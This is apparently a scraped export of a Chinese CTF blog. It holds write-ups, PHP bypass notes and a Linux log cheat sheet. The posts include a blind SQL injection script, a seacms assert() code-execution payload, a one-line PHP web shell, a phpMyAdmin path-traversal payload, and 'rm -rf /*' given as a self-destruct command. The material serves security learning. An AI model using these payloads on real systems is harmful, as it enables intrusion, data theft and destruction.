=&quot;http://47.103.43.235:83/web/a/index.php?id=&quot; flag =&quot;&quot; for i in range(1,40): for j in range(33,128): # playload = &quot;if((ascii(substr(database(),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/group_concat(table_name)/*a*/from/*a*/infoorrmation_schema.tables/*a*/ where/*a*/table_schema/*a*/like/*a*/ database()),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/ group_concat(column_name)/*a*/ from /*a*/infoorrmation_schema.columns/*a*/ where/*a*/ table_name/*a*/like/*a*/&#39;flag&#39;),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; playload = &quot;if((ascii(substr((seleselectct/*a*/flag /*a*/from/*a*/ flag),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # print playload # exit() playload = string_reverse(playload) # print playload r=requests.get(url+playload) # print url+playload # print r.text # exit() if &quot;2019-11-11&quot; in r.text: flag += str(chr(j)) print flag break 就能得到flag: flag{s9li_1s_s0_e4sY} 作战计划进入发现是 seacms 可能存在任意代码执行 原理详见：https://www.jianshu.com/p/a3a18f233184 故playload: http://47.103.43.235:84/search.php?searchtype=5&amp;tid=6&amp;year=2014);assert($_POST[&quot;raidsh&quot;]);// post传参：radish=system(&quot;cat $(find / -name flag*)&quot;) 就能得到flag 池步洲打开页面 查看页面源代码： 发现index.phps 页面 &lt;?php error_reporting(0); $flag = &#39;********&#39;; if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){ if ($_POST[&#39;name&#39;] == $_POST[&#39;password&#39;]) print &#39;name and password must be diffirent&#39;; else if (sha1($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;])) die($flag); else print &#39;invalid password&#39;; } ?&gt; 代发审计一波 发现可以绕过 post传参： name[]=a&amp;password[]=b 就可以得到flag: flag{Y0u_just_br0ke_sha1} obfuse32位ELF文件，无壳，载入IDA中通过关键字符串查找关键代码但是发现f5不好使，只能看汇编，首先输出“password：”，然后再从缓存区读取一串字符串，进入到sub_8048580进行验证，若返回0，则输入的是错误的，若返回1则输入的是正确的 在sub_8048580函数中是一位一位的check _BOOL4 __cdecl sub_8048580(int a1, signed int a2) { signed int v2; // edx char v3; // al _BOOL4 result; // eax char v5[33]; // [esp+Ch] [ebp-A0h] char b20_1; // [esp+2Dh] [ebp-7Fh] char b1f_1; // [esp+2Eh] [ebp-7Eh] char b1e_1; // [esp+30h] [ebp-7Ch] char b1d_1; // [esp+31h] [ebp-7Bh] char b1c_1; // [esp+32h] [ebp-7Ah] char b1b_1; // [esp+33h] [ebp-79h] char b1a_1; // [esp+35h] [ebp-77h] char b19_1; // [esp+36h] [ebp-76h] char b18_1; // [esp+37h] [ebp-75h] char b17_1; // [esp+38h] [ebp-74h] char b16_1; // [esp+39h] [ebp-73h] char b15_1; // [esp+3Ah] [ebp-72h] char b14_1; // [esp+3Ch] [ebp-70h] char b13_0; // [esp+3Dh] [ebp-6Fh] char b12_0; // [esp+3Eh] [ebp-6Eh] char b11_0; // [esp+3Fh] [ebp-6Dh] char b10_0; // [esp+40h] [ebp-6Ch] char bf_0; // [esp+41h] [ebp-6Bh] char be_0; // [esp+42h] [ebp-6Ah] char bd_0; // [esp+43h] [ebp-69h] char bc_1; // [esp+44h] [ebp-68h] char bb_1; // [esp+45h] [ebp-67h] char ba_1; // [esp+56h] [ebp-56h] char b9_0; // [esp+7Ch] [ebp-30h] char b8_0; // [esp+7Dh] [ebp-2Fh] char b7_0; // [esp+7Eh] [ebp-2Eh] char b6_0; // [esp+7Fh] [ebp-2Dh] char b5_1; // [esp+80h] [ebp-2Ch] char b4_1; // [esp+81h] [ebp-2Bh] char b3_1; // [esp+82h] [ebp-2Ah] char b2_1; // [esp+83h] [ebp-29h] char b1_1; // [esp+85h] [ebp-27h] unsigned int v38; // [esp+8Ch] [ebp-20h] v38 = __readgsdword(0x14u); v2 = a2; while ( 2 ) { memset(v5, 0, 0x80u); v3 = *(_BYTE *)(a1 + v2); v5[(v3 + 64) % 128] = 1; if ( (unsigned __int8)(v3 - 10) &lt;= 0x70u ) { switch ( v3 ) { case &#39;\\n&#39;: return v2 == 13 &amp;&amp; ba_1 != 0; case &#39;0&#39;: if ( v2 || !b9_0 ) return 0; v2 = 1; continue; case &#39;1&#39;: if ( v2 == 14 &amp;&amp; b8_0 ) goto LABEL_12; return 0; case &#39;2&#39;: if ( v2 == 20 &amp;&amp; b7_0 ) goto LABEL_15; return 0; case &#39;3&#39;: if ( v2 != 89 || !b6_0 ) return 0; v2 = 90; continue; case &#39;4&#39;: if ( v2 != 15 || !b5_1 ) return 0; v2 = 16; continue; case &#39;5&#39;: if ( v2 != 14 || !b4_1 ) return 0; LABEL_12: v2 = 15; continue; case &#39;6&#39;: if ( v2 != 12 || !b3_1 ) return 0; v2 = 13; continue; case &#39;7&#39;: if ( v2 != 5 || !b2_1 ) return 0; v2 = 6; continue; case &#39;8&#39;: result = 0; if ( b1_1 ) result = v2 == 33 || v2 == 2; return result; case &#39;9&#39;: if ( v2 != 1 || !b1_1 ) return 0; v2 = 2; continue; case &#39;a&#39;: if ( v2 != 35 || !b20_1 ) return 0; v2 = 36; continue; case &#39;b&#39;: if ( v2 != 11 || !b1f_1 ) return 0; v2 = 12; continue; case &#39;c&#39;: if ( v2 != 32 || !b20_1 ) return 0; v2 = 33; continue; case &#39;d&#39;: if ( v2 != 3 || !b1e_1 ) return 0; v2 = 4; continue; case &#39;e&#39;: if ( v2 != 7 || !b1d_1 ) return 0; v2 = 8; continue; case &#39;f&#39;: if ( !b1c_1 || v2 != 8 &amp;&amp; v2 != 4 ) return 0; goto LABEL_53; case &#39;g&#39;: return v2 == 12 &amp;&amp; b10_0 != 0; case &#39;h&#39;: if ( v2 != 13 || !b1b_1 ) return 0; v2 = 14; continue; case &#39;i&#39;: if ( v2 != 9 || !b1a_1 ) return 0; v2 = 10; continue; case &#39;j&#39;: if ( v2 != 10 || !b19_1 ) return 0; v2 = 11; continue; case &#39;k&#39;: return v2 == 12 &amp;&amp; b18_1 != 0; case &#39;l&#39;: if ( v2 != 19 || !b17_1 ) return 0; v2 = 20; continue; case &#39;m&#39;: if ( v2 != 17 || !b16_1 ) return 0; v2 = 18; continue; case &#39;n&#39;: return v2 == 18 &amp;&amp; b16_1 != 0; case &#39;o&#39;: if ( !b15_1 || v2 != 6 &amp;&amp; v2 != 28 ) return 0; LABEL_53: ++v2; continue; case &#39;p&#39;: if ( v2 != 30 || !b14_1 ) return 0; v2 = 31; continue; case &#39;q&#39;: if ( v2 != 29 || !b13_0 ) return 0; v2 = 30; continue; case &#39;r&#39;: if ( v2 != 20 || !b12_0 ) return 0; LABEL_15: v2 = 21; continue; case &#39;s&#39;: if ( v2 != 25 || !b11_0 ) return 0; v2 = 26; continue; case &#39;t&#39;: return v2 == 24 &amp;&amp; b12_0 != 0; case &#39;u&#39;: if ( v2 != 26 || !bf_0 ) return 0; v2 = 27; continue; case &#39;v&#39;: if ( v2 != 2 || !be_0 ) return 0; v2 = 3; continue; case &#39;w&#39;: if ( v2 != 6 || !bd_0 ) return 0; v2 = 7; continue; case &#39;x&#39;: if ( v2 != 22 || !bc_1 ) return 0; v2 = 23; continue; case &#39;y&#39;: if ( v2 != 23 || !bb_1 ) return 0; v2 = 24; continue; case &#39;z&#39;: return v2 == 21 &amp;&amp; b20_1 != 0; default: return 0; } } return 0; } } 根据switch中case的值和case中的if条件就可以反推出来正确的flag flag：09vdf7wefijbkAuth.exe32位的windows上可执行文件，无壳，先运行一下程序： 同样也是载入IDA中通过关键字符串查找关键代码（main函数），本函数前面定义了一大堆数据，最后经过sub_401500处理 int __cdecl main(int argc, const char **argv, const char **envp) { const CHAR *v3; // ebx HMODULE v4; // eax void (__stdcall *v5)(HMODULE, LPCSTR); // eax char v7; // [esp+1h] [ebp-157h] char v8[4]; // [esp+15h] [ebp-143h] int v9; // [esp+20h] [ebp-138h] int v10; // [esp+26h] [ebp-132h] int v11; // [esp+2Ah] [ebp-12Eh] int v12; // [esp+2Eh] [ebp-12Ah] int v13; // [esp+32h] [ebp-126h] int v14; // [esp+36h] [ebp-122h] int v15; // [esp+3Ah] [ebp-11Eh] __int16 v16; // [esp+3Eh] [ebp-11Ah] int v17; // [esp+40h] [ebp-118h] int v18; // [esp+44h] [ebp-114h] int v19; // [esp+48h] [ebp-110h] int v20; // [esp+4Ch] [ebp-10Ch] int v21; // [esp+50h] [ebp-108h] int v22; // [esp+54h] [ebp-104h] int v23; // [esp+58h] [ebp-100h] int v24; // [esp+5Ch] [ebp-FCh] int v25; // [esp+60h] [ebp-F8h] int v26; // [esp+64h] [ebp-F4h] int v27; // [esp+68h] [ebp-F0h] int v28; // [esp+6Ch] [ebp-ECh] int v29; // [esp+70h] [ebp-E8h] char v30; // [esp+74h] [ebp-E4h] int a_2; // [esp+75h] [ebp-E3h] int v32; // [esp+79h] [ebp-DFh] int v33; // [esp+7Dh] [ebp-DBh] int v34; // [esp+81h] [ebp-D7h] int v35; // [esp+85h] [ebp-D3h] int v36; // [esp+89h] [ebp-CFh] int v37; // [esp+8Dh] [ebp-CBh] int v38; // [esp+91h] [ebp-C7h] __int16 v39; // [esp+95h] [ebp-C3h] int a_1; // [esp+97h] [ebp-C1h] int v41; // [esp+9Bh] [ebp-BDh] int v42; // [esp+9Fh] [ebp-B9h] int v43; // [esp+A3h] [ebp-B5h] int v44; // [esp+A7h] [ebp-B1h] int v45; // [esp+ABh] [ebp-ADh] int v46; // [esp+AFh] [ebp-A9h] int v47; // [esp+B3h] [ebp-A5h] char v48; // [esp+B7h] [ebp-A1h] int v49; // [esp+B8h] [ebp-A0h] int v50; // [esp+BEh] [ebp-9Ah] int v51; // [esp+C2h] [ebp-96h] int v52; // [esp+C6h] [ebp-92h] int v53; // [esp+CAh] [ebp-8Eh] int v54; // [esp+CEh] [ebp-8Ah] int v55; // [esp+D2h] [ebp-86h] int v56; // [esp+D6h] [ebp-82h] int v57; // [esp+DAh] [ebp-7Eh] char v58; // [esp+DEh] [ebp-7Ah] int v59; // [esp+DFh] [ebp-79h] int v60; // [esp+E3h] [ebp-75h] int v61; // [esp+E7h] [ebp-71h] int v62; // [esp+EBh] [ebp-6Dh] int v63; // [esp+EFh] [ebp-69h] int v64; // [esp+F3h] [ebp-65h] int v65; // [esp+F7h] [ebp-61h] int v66; // [esp+FBh] [ebp-5Dh] __int16 v67; // [esp+FFh] [ebp-59h] int v68; // [esp+101h] [ebp-57h] int v69; // [esp+105h] [ebp-53h] char v70; // [esp+109h] [ebp-4Fh] int v71; // [esp+10Ah] [ebp-4Eh] int v72; // [esp+10Eh] [ebp-4Ah] int v73; // [esp+112h] [ebp-46h] int v74; // [esp+116h] [ebp-42h] int v75; // [esp+11Ah] [ebp-3Eh] int v76; // [esp+11Eh] [ebp-3Ah] int v77; // [esp+122h] [ebp-36h] int v78; // [esp+126h] [ebp-32h] int v79; // [esp+12Ah] [ebp-2Eh] int v80; // [esp+12Eh] [ebp-2Ah] int v81; // [esp+132h] [ebp-26h] int v82; // [esp+136h] [ebp-22h] int v83; // [esp+13Ah] [ebp-1Eh] int v84; // [esp+13Eh] [ebp-1Ah] int v85; // [esp+142h] [ebp-16h] int v86; // [esp+146h] [ebp-12h] int v87; // [esp+14Ah] [ebp-Eh] __int16 v88; // [esp+14Eh] [ebp-Ah] int *v89; // [esp+150h] [ebp-8h] v89 = &amp;argc; sub_402940(); puts( &quot; . \\n&quot; &quot; _|_ ROBOTIC AUTHENTICATION SYSTEM\\n&quot; &quot; /\\\\/\\\\ (. .) /\\n&quot; &quot; `||&#39; |#| \\n&quot; &quot; ||__.-\\&quot;-\\&quot;-.___ \\n&quot; &quot; `---| . . |--.\\\\ \\n&quot; &quot; | : : | ,||,\\n&quot; &quot; `..-..&#39; \\\\/\\\\/\\n&quot; &quot; || || \\n&quot; &quot; || || \\n&quot; &quot; |__|__| \\n&quot;); v49 = 0x539; v50 = 0x60646D51; v51 = 0x64216472; v52 = 0x7364756F; v53 = 0x64697521; v54 = 0x73686721; v55 = 0x51217572; v56 = 0x76727260; v57 = 0x3B65736E; v58 = 1; a_1 = 0x60646D51; v41 = 0x64216472; v42 = 0x7364756F; v43 = 0x64697521; v44 = 0x73686721; v45 = 0x51217572; v46 = 0x76727260; v47 = 0x3B65736E; v48 = 1; v59 = 0x60646D51; v60 = 0x64216472; v61 = 0x7364756F; v62 = 0x64697521; v63 = 0x62647221; v64 = 0x21656F6E; v65 = 0x72726051; v66 = 0x65736E76; v67 = 315; a_2 = 0x60646D51; // Please enter the second Password v32 = 0x64216472; v33 = 0x7364756F; v34 = 0x64697521; v35 = 0x62647221; v36 = 0x21656F6E; v37 = 0x72726051; v38 = 0x65736E76; v39 = 315; v68 = 0x6F6F3074; v69 = 0x666D3367; v70 = 3; v28 = 0x6F6F3074; v29 = 0x666D3367; v30 = 3; v71 = 0x6F73646A; v72 = 0x33326D64; v73 = 0x6D6D652F; v74 = 0x13F0101; v24 = 0x6F73646A; v25 = 0x33326D64; v26 = 0x6D6D652F; v27 = 0x13F0101; v75 = 0x57656540; v76 = 0x6E756264; v77 = 0x44656473; v78 = 0x71646279; v79 = 0x6F6E6875; v80 = 0x656F6049; v81 = 0x173646D; v17 = 0x57656540; v18 = 0x6E756264; v19 = 0x44656473; v20 = 0x71646279; v21 = 0x6F6E6875; v22 = 0x656F6049; v23 = 0x173646D; v82 = 0x21746E58; v83 = 0x2F6F6876; v84 = 0x6F6E4221; v85 = 0x75607366; v86 = 0x75606D74; v87 = 0x726F6E68; v88 = 0x120; v10 = 0x21746E58; v11 = 0x2F6F6876; v12 = 0x6F6E4221; v13 = 0x75607366; v14 = 0x75606D74; v15 = 0x726F6E68; v16 = 0x120; v9 = 0x539; strcpy(v8, &quot;r0b0RUlez!&quot;); dword_40AD94 = (int)&amp;v9; dword_40ADA0 = (int)&amp;v49; dword_40AD8C = (char *)&amp;a_1; dword_40AD90 = (char *)&amp;a_2; dword_40AD98 = (int)&amp;v28; lpProcName = (LPCSTR)&amp;v17; lpModuleName = (LPCSTR)&amp;v24; dword_40ADA4 = (char *)&amp;v10; sub_401500(0); v3 = lpProcName; v4 = GetModuleHandleA(lpModuleName); v5 = (void (__stdcall *)(HMODULE, LPCSTR))GetProcAddress(v4, v3); v5((HMODULE)1, (LPCSTR)sub_40157F); puts(dword_40AD8C); scanf(&quot;%20s&quot;, &amp;v7); if ( !strcmp(&amp;v7, v8) ) { puts(&quot;You passed level1!&quot;); sub_4015EA(0); } return 0; } 在sub_401500函数中对刚刚定义的数据的每一位都和1异或先把数据解密一下： data1=&quot;516D6460726421646F756473217569642167687372752151607272766E73653B&quot; str1 =&quot;&quot; for x in range(0,len(data1),2): str1 += chr(eval(&quot;0x&quot;+data1[x:x+2])^1) print str1 data2 = &quot;516D6460726421646F75647321756964217264626E6F652151607272766E73653B&quot; str2 =&quot;&quot; for x in range(0,len(data2),2): str2 += chr(eval(&quot;0x&quot;+data2[x:x+2])^1) print str2 data3 = &quot;74306F6F67336D66&quot; str3 =&quot;&quot; for x in range(0,len(data3),2): str3 += chr(eval(&quot;0x&quot;+data3[x:x+2])^1) print str3 data4 = &quot;6A64736F646D32332F656D6D&quot; str4 = &quot;&quot; for x in range(0,len(data4),2): str4 += chr(eval(&quot;0x&quot;+data4[x:x+2])^1) print str4 data5 = &quot;406565576462756E736465447962647175686E6F49606F656D6473&quot; str5 = &quot;&quot; for x in range(0,len(data5),2): str5 += chr(eval(&quot;0x&quot;+data5[x:x+2])^1) print str5 data6 = &quot;586E742176686F2F21426E6F66736075746D6075686E6F7220&quot; str6 = &quot;&quot; for x in range(0,len(data6),2): str6 += chr(eval(&quot;0x&quot;+data6[x:x+2])^1) print str6 输出结果：发现是一些需要输出的字符串 接下来程序接收一个字符串，与字符串“r0b0RUlez!”进行比较，这是第一层限制，然后来到函数sub_4015EA，在这个里面构造了一个异常，当程序走到这里的时候，发生异常而进行跳转，在跳转之前改变了一个数据，第二跳是在这个函数中的，那么我们就跟进第一条 跟进之后来到一个函数中，再接收一个字符串，进入sub_401547进行比较 在sub_401547函数中对字符串“u1nnf2lg”每一位都与2异或 解密得到“w3lld0ne” flag = &quot;u1nnf2lg&quot; real_flag =&quot;&quot; for x in range(len(flag)): real_flag+=chr(ord(flag[x])^2) print real_flag 最后将字符串拼接起来 flag：r0b0RUlez!_w3lld0ne","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"CTF中常见的web","slug":"CTF中常见的web","date":"2019-03-10T07:18:34.261Z","updated":"2019-06-05T09:01:33.602Z","comments":true,"path":"2019/03/10/CTF中常见的web/","link":"","permalink":"http://yoursite.com/2019/03/10/CTF中常见的web/","excerpt":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码","text":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码 表单标签的属性比如修改input标签的maxlenth属性来得到flag 伪造IPX-Forwarded-For:127.0.0.1 body标签之外有时候题目作者会把提示放在body标签和html标签之间，这样提示不会出现在网页页面，需要查看网页源码才能看到。 数据包信息隐藏在数据包的请求头和响应头里，通过抓包来获取 robots.txt一般网站会有robots.txt来规范爬虫的行为，利用robots.txt有可能获取到网站重要文件所在的位置 备份文件（还没见过）某些编译器会在编译时生成一些备份文件，如果不写正确处理这些文件，黑客可以利用这些文件来还原源码如： 网站备份压缩 .rar .zip .7z .tar.gz .bak PHP代码审计(常见漏洞)is_numeric(mixed $var)这是检测变量是否为数字或者数字字符串 有时候会需要绕过该函数的判断，课以利用科学计数法 如 1 == 1E+0 strip_tags(string allow)的逻辑错误这是一个剥去字符串中html、xml以及php的标签的函数。 allow可选。规定允许的标签，这些标签会不会被删除 有些代码会将该函数放在过滤代码之后，那么可以通过在payload中嵌入HTML、XML 以及PHP标签的方式绕过之前的过滤代码。 urldecode()逻辑漏洞同strip_tags(),将该函数放在判断函数之后的话可通过对payload的二次url编码绕过之前的判断函数。 本地包含 eval()函数把字符串按照PHP代码执行 var_dump()打印变量的相关信息 show_source() 函数对文件进行语法高亮显示 如果以上变量函数可控且未经处理，可执行恶意代码 $GLOBALS$GLOBALS：是一个数组，包含了全局作用域中可用的全部变量。变量的名字就是数组的键。合理利用$GLOBALS全局变量也许可以获得可利用变量信息。常与var_dump()函数连用。 php://伪协议php://filter伪协议php://filter 的参数列表 read 读取 write 写入 resource 数据来源(必须的) read参数值可以为 string.stip_tags 将数据流中的HTML标签清除 string.toupper 将数据流中的内容转换为大写 string.tolower 将数据流中的内容转换为小写 convert.base64-encode 将数据流中的内容转换为base64编码 convertr.base64-decode 与上面对应的解码 利用这个函数漏洞需和文件包含漏洞一起使用，可以读取网页的PHP源代码 index.php?file=php://filter/read=convert.base64-encode/resource=index.php php://input 一句话木马php://input 用来接收post数据的 可以接收一句话木马&lt;?php eval($_POST[‘a’]); ?&gt;","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"PHP的黑魔法","slug":"PHP的黑魔法","date":"2019-03-10T07:18:34.261Z","updated":"2019-05-29T12:33:02.793Z","comments":true,"path":"2019/03/10/PHP的黑魔法/","link":"","permalink":"http://yoursite.com/2019/03/10/PHP的黑魔法/","excerpt":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 &#39;123abc&#39; == 123","text":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 &#39;123abc&#39; == 123 md5(),sha1()md5()是不能处理数组的 md5(数组)会返回null，两个null相等绕过 md5([1]) == md5([2]) sha1()函数也是这样 md5($pass,true)可以让pass=ffifdyop 绕过 intval()intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。 即使出现无法转换的字符串也不会报错的，会直接返回0 var_dump((int)(&#39;1e-1000&#39;)&gt;0); // 1&gt;0 echo &quot;&lt;br&gt;&quot;; var_dump(&#39;1e-1000&#39;&gt;0); echo &quot;&lt;br&gt;&quot;; 输出结果为： bool(true) bool(false) var_dump((int)(&#39;1e-10&#39;)&gt;0); echo &quot;&lt;br&gt;&quot;; var_dump(&#39;1e-10&#39;&gt;0); echo &quot;&lt;br&gt;&quot;; 输出结果为： bool(true) bool(true) strcmp()函数strcnp()函数只有在相等的情况下才会返回0 若果我们传入一个数组，他会返回NULL,而判断使用的是\\==而NULL==0是bool(true)，这样就成功绕过。 $a=[]; if(strcmp($a,&quot;haha&quot;)) { echo 1; }else{ echo 2; } 输出的结果 2 说明可以绕过strcmp()函数 ereg()函数字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。 is_numeric()函数 当有两个is_numeric判断并用and后面的is_numeric可以绕过 $a = []; $b = aaa; if(is_numeric($b) == is_numeric($a)) { echo 1; }else{ echo 2; } echo &quot;&lt;br&gt;&quot;; 输出结果 1 说明第二个变量我们可以任意输入，可以绕过 16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤 $a = 8; $b = 0x8; if(is_numeric($a) == is_numeric($b)) { echo 1; }else{ echo 2; } echo &quot;&lt;br&gt;&quot;; 输出结果 1 说明可以绕过16进制也可以绕过 switch()函数当switch没有break时可以继续往下执行。这里也有自动转换，比如$switch_bug = a,会当0执行，$switch_bug =1a，会当1执行…… array_search()函数用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功 $array_search=[&#39;haha&#39;,&#39;hehe&#39;,0]; $eee = @array_search(&quot;XMAN&quot;, $array_search); if($eee){ echo &quot;array_search()检索字符串绕过成功&quot;; }else{ echo &quot;array_search()检索字符串绕过失败&quot;; } 输出结果： array_search()检索字符串绕过成功","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"linux 日志分析","slug":"linux-日志分析","date":"2019-01-09T08:19:07.000Z","updated":"2019-05-29T12:32:25.686Z","comments":true,"path":"2019/01/09/linux-日志分析/","link":"","permalink":"http://yoursite.com/2019/01/09/linux-日志分析/","excerpt":"","text":"linux 日志分析Linux 基础命令一些常用的linux命令 cd 切换目录 cd / 回到根目录 ls 查看当前文件夹下的内容 ls -a 显示所有文件，包括隐藏文件 ls -l 显示文件的详细信息 cat 查看文件内容 pwd 显示当前工作路径 cp filename newfilename 复制文件，可以加上路径 mv filename filename 剪切文件，第一个是原文件路径，第二个是目标文件的路径，如果不加路径，相当于重命名 mkdir name 新建文件夹 vi/vim filename 编辑或者是新建一个文件 name -r 显示linux内核版本 cat /proc/version 查看当前操作系统版本信息 cat /etc/lsb-release 查看具体发行版本信息等等 cat /etc/issue lsb_release whoami 查看当前用户身份 id 查看当前用户分组 rm -rf filename 删除命令 rm -rf /* 自毁命令 日志文件一些重要的日志文件 history 查看最近执行的命令 etc/httpd/access_log web的系统日志 etc/httpd/ 这个文件下都是web的日志 var/log/ 这个文件下面都是linux系统的日志 var/log/wtmp 记录每个用户的登录次数和持续的时间等信息 var/log/btmp 记录登陆失败的信息 var/log/utmp 用户登陆信息 var/log/secure Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况 var/log/messages 记录Linux操作系统常见的系统和服务错误信息 /var/log/maillog 该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统 /var/log/xferlog 该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用 last 列出当前以及曾经登入系统的用户信息，其实读取的还是wtmp文件 lastlog 列出所有用户最近登录的信息(登录时间，登陆ip等)，或者指定用户的最近登录信息 lastb 列出失败尝试的登陆信息 w 查看当前登入系统的用户信息及用户当前的进程 tail -f -n -d xxx_log 如果日志还在更新，可以用该条命令实时查看,-d表示不同地方，-n多少秒刷新一次 感觉比较重要的常用的日志文件就这么多吧。其他的遇见了再总结！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"HCTF 2018 wp","slug":"HCTF-2018-wp","date":"2019-01-08T15:50:09.000Z","updated":"2019-06-05T09:01:04.701Z","comments":true,"path":"2019/01/08/HCTF-2018-wp/","link":"","permalink":"http://yoursite.com/2019/01/08/HCTF-2018-wp/","excerpt":"HCTF2018","text":"HCTF2018 web 签到题 warmup点击之后发现是个文件包含类型的 url:http://warmup.2018.hctf.io/index.php?file=hint.php source.php的源码也有 &lt;?php class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&#39;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; } } if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) { include $_REQUEST[&#39;file&#39;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 可以看到对我们传入的参数一定的要求 if (!empty($_REQUEST[&#39;file&#39;]) &amp;&amp;is_string($_REQUEST[&#39;file&#39;]) &amp;&amp;emmm::checkFile($_REQUEST[&#39;file&#39;]) ) 发现只有source.php hint.php 才能绕过截取 $whitelist=[&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 截取函数 截取你传入参数?前的内容 $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) 判断截取的内容是否在数组whitelist里面 if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; 所以要利用?截取处hint.php或者source.php，利用hint。php成为一个不存在的目录，最后include利用../../跳出目录来读取flag payload: index.php?file=source.php?/../../../../ffffllllaaaagggg index.php?file=hint.php?/../../../../ffffllllaaaagggg ps 直接把source的源码复制搜索就可以找到这个漏洞 受影响版本: phpMyAdmin4.8.0 phpMyAdmin4.8.1 https://blog.csdn.net/nzjdsds/article/details/81260335 Game注册账号进去之后发现，他将所有的用户名的列了出来 http://game.2018.hctf.io/web2/user.php?order=id 通过URL发现排序的方式是可控的所以我们让他按密码排序 http://game.2018.hctf.io/web2/user.php?order=password 然后通过建立不同的账号密码来确定admin的密码 admin的账号的id为1 这是网上大佬批量注册账号的代码通过这个账号来手工测试密码 import requests import hashlib import threading def md5(str): sha = hashlib.md5(str) encrypts = sha.hexdigest() return encrypts def reg(username,password): url = &#39;http://game.2018.hctf.io/web2/action.php?action=reg&#39; data = { &quot;username&quot;:username, &quot;password&quot;:password, &quot;sex&quot;:&quot;1&quot;, &quot;submit&quot;:&quot;submit&quot; } headers = { &#39;Connection&#39;: &#39;close&#39;, } r = requests.post(url=url,data=data,headers=headers) def fuzz(start,end): for i in range(start,end): password = &#39;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dj&#39;+chr(i) username=md5(password) content = username + &quot; &quot; + password +&quot; &quot;+ str(i) + &quot;\\n&quot; reg(username, password) print content print str(start)+&#39;~&#39;+str(end)+&quot;complete&quot; step=20 for i in range(33,127,step): t = threading.Thread(target=fuzz, args=(i, i+step)) t.start() 注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"初识php反序列化","slug":"初识php反序列化","date":"2019-01-08T15:39:38.000Z","updated":"2019-06-05T09:02:11.193Z","comments":true,"path":"2019/01/08/初识php反序列化/","link":"","permalink":"http://yoursite.com/2019/01/08/初识php反序列化/","excerpt":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize()","text":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize() serialize()函数当在php创建了一个对象后，可以通过serialize()函数把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。 序列化格式整形的序列化格式&lt;?php $number = 34; var_dump(serialize($number)); ?&gt; 输出结果为： string(5) &quot;i:34;&quot; 解释： 因为serialize()函数所以输出的是一个字符串类型的 i表示integer类型 34就是变量的值 doule类型的序列化格式&lt;?php $double = 5.5; var_dump(serialize(double)); ?&gt; 输出结果为： string(6) &quot;d:5.5;&quot; 解释 d 表示double类型 5.5 为变量的值 string类型的序列化格式&lt;?php $str = &#39;chuddy&#39;; var_dump(serialize($str)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果为： string(13) &quot;s:6:&quot;chuddy&quot;;&quot; 解释： s 代表string类型 chuddy 为变量的值 布尔类型的序列化格式&lt;?php $bool = true; $bool_1 = false; var_dump(serialize($bool)); echo &quot;&lt;br&gt;&quot;; var_dump(serialize($bool_1)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果： 